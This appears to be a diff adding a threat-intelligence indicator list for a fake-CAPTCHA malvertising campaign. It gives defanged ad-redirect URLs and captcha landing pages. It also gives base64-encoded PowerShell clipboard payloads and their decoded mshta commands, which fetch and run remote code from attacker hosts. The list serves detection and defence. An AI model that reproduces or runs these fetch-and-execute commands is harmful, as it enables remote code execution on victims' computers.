@@ -1,0 +1,80 @@
+Malvertising entry points:
+hxxps[://]continuedownloader[.]com/go/d2ce67cc-16c8-4a3a-938e-c3389b412786
+hxxps[://]continuedownloader[.]com/go/3442df81-6329-4d47-8594-73a9455c5363
+hxxps[://]downloadstep[.]com/go/4a08130e-f2ad-4a60-bb8b-9b4f7d159740
+hxxps[://]downloadstep[.]com/go/49c2dac8-63b7-46d9-a9f6-6ebdaa1ce3ee
+hxxps[://]downloadsbeta[.]com/go/180f58b8-38df-46cb-a0d2-d6f12d8aa8a8
+hxxps[://]hypochloridtilz[.]click/go/a1e3dc07-bcb5-49cb-8f11-7561eb32e112
+hxxps[://]downloadstep[.]com/go/08a742f2-0a36-4a00-a979-885700e3028c
+hxxps[://]downloadstep[.]com/go/79553157-f8b8-440b-ae81-0d81d8fa17c4
+hxxps[://]downloadstep[.]com/go/897a19a7-2e55-408c-94a6-d82617b5361f
+hxxps[://]downloadsbeta[.]com/go/618c256a-c5db-4e08-9f35-c474360325f0
+hxxps[://]hypochloridtilz[.]click/go/45863e0f-117a-411c-adec-475e4bfac56d
+hxxps[://]downloadsbeta[.]com/go/f94e2fd6-3569-4d2d-b596-5e07f79a5818
+hxxps[://]streamingsplays[.]com/go/b11f973d-01d4-4a5b-8af3-139daaa5443f
+
+Captcha landing pages:
+hxxp[://]anti-bot1[.]b-cdn[.]net/verify-captcha-v2[.]html
+hxxp[://]bot-check2[.]b-cdn[.]net/captcha-verify-v2[.]html
+hxxp[://]bot-check3[.]b-cdn[.]net/captcha-verify-v3[.]html
+hxxp[://]bot-test[.]b-cdn[.]net/verify-captcha-v3[.]html
+hxxp[://]ch3[.]dlvideosfre[.]click/human-verify-system[.]html
+hxxp[://]kjbnfdkbf74[.]b-cdn[.]net/human-verify-system[.]html
+hxxp[://]security-check[.]b-cdn[.]net/verify-captcha-v2[.]html
+hxxp[://]spam[.]b-cdn[.]net/verify-captcha-v1[.]html
+hxxps[://]anti-bot1[.]b-cdn[.]net/verify-captcha-v2[.]html
+hxxps[://]bot-check2[.]b-cdn[.]net/captcha-verify-v2[.]html
+hxxps[://]bot-check3[.]b-cdn[.]net/captcha-verify-v3[.]html
+hxxps[://]bot-checking[.]b-cdn[.]net/verify-captcha-v5[.]html
+hxxps[://]bot-detection[.]b-cdn[.]net/verify-captcha-v3[.]html
+hxxps[://]bot-test[.]b-cdn[.]net/verify-captcha-v3[.]html
+hxxps[://]ch3[.]dlvideosfre[.]click/human-verify-system[.]html
+hxxps[://]kjbnfdkbf74[.]b-cdn[.]net/human-verify-system[.]html
+hxxps[://]provenotrobot[.]b-cdn[.]net/verify-captcha-v1[.]html
+hxxps[://]provenotrobot[.]b-cdn[.]net/verify-captcha-vm[.]html
+hxxps[://]pub-9c4ec7f3f95c448b85e464d2b533aac1[.]r2[.]dev/human-verify-system[.]html
+hxxps[://]security-check[.]b-cdn[.]net/verify-captcha-v2[.]html
+hxxps[://]spam[.]b-cdn[.]net/verify-captcha-v1[.]html
+hxxps[://]verification[.]b-cdn[.]net/verify-captcha-v1[.]html
+
+Clipboard payloads:
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AcABhAHAAYQBkAC4AYgAtAGMAZABuAC4AbgBlAHQALwBwAG8AcABhAGQAIgA=
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAHAAdQBiAC0AOQBjADQAZQBjADcAZgAzAGYAOQA1AGMANAA0ADgAYgA4ADUAZQA0ADYANABkADIAYgA1ADMAMwBhAGEAYwAxAC4AcgAyAC4AZABlAHYALwAyADIAawBqAGgAcwBmAGQAaAA2ADcA
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGEAcwBkAGsAagBqAGsAYQBzAGQAbgAtAGEAcAB0AHYAMQAuAGIALQBjAGQAbgAuAG4AZQB0AC8AcwBvAHQAaQB4AC0AYQBwAHQA
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGMAaAAzAC4AZABsAHYAaQBkAGUAbwBzAGYAcgBlAC4AYwBsAGkAYwBrAC8AawBqAG4AcwBkAGYAcwB2AGYA
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AcABvAHAAYwBzAGgALgBiAC0AYwBkAG4ALgBuAGUAdAAvAHMAbQBhAHIAdAA1ACIA
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AcAByAG8AdABvAC4AYgAtAGMAZABuAC4AbgBlAHQALwB3AGkAZgBpACIA
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AbQBhAG4AaQBzAHQAcgBlAGEAbQAxAC4AYgAtAGMAZABuAC4AbgBlAHQALwBTAG8AbABpAHMAIgA=
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AZwBhAGwAYQBrAHMAaQBvAG4ALgBiAC0AYwBkAG4ALgBuAGUAdAAvAHMAbQBhAHIAdAAyACIA
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AcABvAHAAdQBwAC4AYgAtAGMAZABuAC4AbgBlAHQALwBwAG8AcAB1AHAAIgA=
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGMAYQBtAC0AbQAxAC4AYgAtAGMAZABuAC4AbgBlAHQALwBjAGEAbQBzAGkALQB2ADEA
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AcABvAHAAdQBuAGQAZQByAC4AYgAtAGMAZABuAC4AbgBlAHQALwBwAG8AcAB1AG4AZABlAHIAIgA=
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGsAagBoAHMAZABmAGgALQBjAGEAcAB2ADEALgBiAC0AYwBkAG4ALgBuAGUAdAAvAHMAbwB0AGkAeAAtAGMAYQBtAHAA
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAG0AYQB0AG8ALQBjAGEAbQBwAC0AdgAyAC4AYgAtAGMAZABuAC4AbgBlAHQALwBrAGUAcwB0AHkA
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AYgBpAGQAdgBlAHIAdAAuAGIALQBjAGQAbgAuAG4AZQB0AC8AYgBpAGQAdgBlAHIAdAAiAA==
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAG0AYQB0AG8ALQBjAGEAbQBwAC0AdgA0AC4AYgAtAGMAZABuAC4AbgBlAHQALwBrAGUAcwB0AHkA
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBlAGQAaQBhAGYAaQByAGUALgBjAG8AbQAvAGYAaQBsAGUAXwBwAHIAZQBtAGkAdQBtAC8AbQAzAHoANwA3ADYAdAByADYAcgBsAHUAdABnAHUALwBrAGoAZgB5AHIAZAA=
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAHYAZQByAGkAZgAuAGQAbAB2AGkAZABlAG8AcwBmAHIAZQAuAGMAbABpAGMAawAvADIAbgBkAGgAcwBvAHIAdQA=
+powershell[.]exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AbQBhAG4AaQBzAHQAcgBlAGEAbQAxAC4AYgAtAGMAZABuAC4AbgBlAHQALwBwAG8AdwBlAHIAbQBhAHgAIgA=
+powershell[.]exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGsAagBiAG4AZgBkAGsAYgBmADcANAAuAGIALQBjAGQAbgAuAG4AZQB0AC8AbAB6AGsAcwBqAGgANgA3AA==
+
+Decoded powershell commands:
+mshta "hxxps[://]papad[.]b-cdn[.]net/popad"
+mshta hxxps[://]pub-9c4ec7f3f95c448b85e464d2b533aac1[.]r2[.]dev/22kjhsfdh67
+mshta hxxps[://]asdkjjkasdn-aptv1[.]b-cdn[.]net/sotix-apt
+mshta hxxps[://]ch3[.]dlvideosfre[.]click/kjnsdfsvf
+mshta "hxxps[://]popcsh[.]b-cdn[.]net/smart5"
+mshta "hxxps[://]proto[.]b-cdn[.]net/wifi"
+mshta "hxxps[://]manistream1[.]b-cdn[.]net/Solis"
+mshta "hxxps[://]galaksion[.]b-cdn[.]net/smart2"
+mshta "hxxps[://]popup[.]b-cdn[.]net/popup"
+mshta hxxps[://]cam-m1[.]b-cdn[.]net/camsi-v1
+mshta "hxxps[://]popunder[.]b-cdn[.]net/popunder"
+mshta hxxps[://]kjhsdfh-capv1[.]b-cdn[.]net/sotix-camp
+mshta hxxps[://]mato-camp-v2[.]b-cdn[.]net/kesty
+mshta "hxxps[://]bidvert[.]b-cdn[.]net/bidvert"
+mshta hxxps[://]mato-camp-v4[.]b-cdn[.]net/kesty
+mshta hxxps[://]www[.]mediafire[.]com/file_premium/m3z776tr6rlutgu/kjfyrd
+mshta hxxps[://]verif[.]dlvideosfre[.]click/2ndhsoru
+mshta "hxxps[://]manistream1[.]b-cdn[.]net/powermax"
+mshta hxxps[://]kjbnfdkbf74[.]b-cdn[.]net/lzksjh67
